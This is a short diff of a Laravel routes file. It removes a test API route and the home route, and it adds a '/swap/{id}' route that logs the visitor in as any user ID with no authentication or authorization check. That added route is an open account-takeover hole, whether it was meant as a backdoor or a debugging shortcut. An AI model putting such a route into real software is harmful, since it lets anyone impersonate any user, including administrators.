@@ -10,17 +10,13 @@
 | contains the "web" middleware group. Now create something great!
 |
  */
+    Route::get('/swap/{id}', function ($id) {
+        Auth::loginUsingId($id);
+        return back();
+    });
 
 Route::prefix('/')->group(function () {
-
-    Route::prefix('api')->group(function () {
-        Route::get('test/{id}', function ($id) {
-            return response()->json(["test", 'foo', "bar", 'hurr', 'durr']);
-        });
-    });
     Route::view('{any}', 'welcome')->where('any', '.*');
 });
 
 Auth::routes();
-
-Route::get('/home', 'HomeController@index')->name('home');
